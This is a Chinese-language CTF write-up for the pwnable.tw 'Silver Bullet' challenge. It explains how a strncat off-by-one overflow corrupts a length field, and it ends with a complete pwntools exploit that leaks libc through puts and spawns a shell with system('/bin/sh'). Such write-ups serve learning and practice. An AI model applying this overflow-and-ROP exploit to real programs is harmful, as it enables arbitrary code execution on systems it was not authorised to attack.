---
title: Bullet
date: 2018-03-29 22:23:06
tags: ctf,pwn
---


注意`stack`或是`struct`的`layout`

漏洞`strncat(bullet->desc,buf,MAX - bullet->power)`; 
这样首先`create`长度为47的`bullet`，通过`power_up` 再增加一个`power` 此时bullet长度为48
通过`strnact` 最后还会赋值 `null` ,因此造成溢出,`power`會從`\x2f`蓋成`\x00`  
又因为 `power = strlen(power) + power` 所以最后`power`为1
杀死`gin`才会触发`return`;

再次`powerup`的时候,由于`len`和`char`间没有`\0`,`strncat`会连接到`len`的后面,从而改写`len`并`rop`.
注意`payload` 中不能有`null` 
由於程式本身有`NX`保护，必須使用ROP控制程式行為 但許多address因包含null byte，這些address無法被strncat複製到buffer上，因此覆寫main frame的return address時最多只能使用ROP執行某些gadgets。


再做一次 power_up() 就可以修改掉 power 的值並 overflow 到 main() 的 return address

最後把 power 改超大殺死 Werewolf 就可以触发 return ，而我们通过溢出修改 return 处的栈帧达到我们的目的
首先要泄露libc 的基址，从而得到system和 bin/sh 的地址，这里借用puts 函数
然后再触发system 函数 所以需要利用两次漏洞，第一次漏洞利用时返回地址应该是 main 。


内置的ROP怎么用
怎么查看 main的 return address是在overflow之後7個bytes 呢？？？看了半天 使用pattern search 可以算出offset 
终于可以写payload了
但是我输入了\xff\xff\xff 为什么就是打不败呢？？

这是别人的步骤：
step1：创建银弹，长度47
step2：补充银弹，长度1
step3：补充银弹，长度47
 |\xff * 3| + | junk(四字节)| + | put_addr | + | main_addr | + | got表中存储read的位置|
step4：调用beat，打败werewolf
step5：函数返回，调用puts，获得read()函数地址，并据此计算出libc基址，以及system、binsh地址等
step6：函数再次执行main，重复step1、step2
step7：补充银弹，长度47
`|\xff * 3| + | junk（四字节）| + | system_addr | + |junk（四字节）| + |bin_sh_addr|`
 
\xff 写成 xff 获取read地址的时候处理得也不对
最后一个beat 一直报错？ 干脆直接进入交互模式 在beat好了 
各种乱七八糟的终于成功getshell了 但是直接就EOF 执行不下去了 重新执行一遍 又好了 感觉本地不行到服务器上又可以了，然后服务器有时候还连不上或者程序一开始就运行错 这样子我都会怀疑是不是自己写错了555
不过最后终于成功了 开心开心

最终payload
``` python
from pwn import *
elf = ELF('./silver_bullet')
# sh = process('silver_bullet')
sh = remote('chall.pwnable.tw', 10103)
libc = ELF('./libc_32.so.6')

def create(content):
    sh.sendline('1')
    sh.sendlineafter(":",content)
    sh.recvuntil('Your choice :')
    

def powerup(content):
    sh.sendline('2')
    sh.sendlineafter(":",content)
    sh.recvuntil('Your choice :')

def  beat():
    sh.sendline('3')
    # sh.recvuntil('!')
    return  sh.recvuntil('Your choice :')

sh.recvuntil('Your choice :')
payload = '\xff'*3+'aaaa'+p32(elf.symbols['puts'])+p32(elf.symbols['main'])+p32(elf.got['read'])
create('a'*47)
powerup('a')
powerup(payload)
tmp = beat()
data = tmp.split('\n')[6]
read_addr = u32(data[0:4])  #这里的处理是参考别人的 
# read_addr = u32(sh.recv()[:4]) 
print  read_addr
read_libc= libc.symbols['read']
libc_base = read_addr-read_libc
sys_addr = libc.symbols['system']+libc_base
bin_addr = next(libc.search('/bin/sh\x00'))+libc_base
create('a'*47)
powerup('a')
payload = '\xff'*3+'aaaa'+p32(sys_addr)+p32(0xdeafbeef)+p32(bin_addr)
powerup(payload)
# beat()
sh.interactive()
# sh.recvuntil('Oh ! You win !!')
```

data = tmp.split('\n')[6] 是按照这样子输出的：
    
>----------- Werewolf -----------<
 + NAME : Gin
 + HP : 2147483647
>--------------------------------<
Try to beat it .....
Oh ! You win !!
xxx 地址
menu 

因此地址在第七行T
参考：
http://veritas501.space/2018/02/21/pwnable.tw%201~10%E9%A2%98%20writeup/
http://look3little.blogspot.sg/2017/03/silverbullet-200.html (十分详细)
http://blog.c0smic.cn/2017/12/10/pwnable_tw_4_6/ 详细
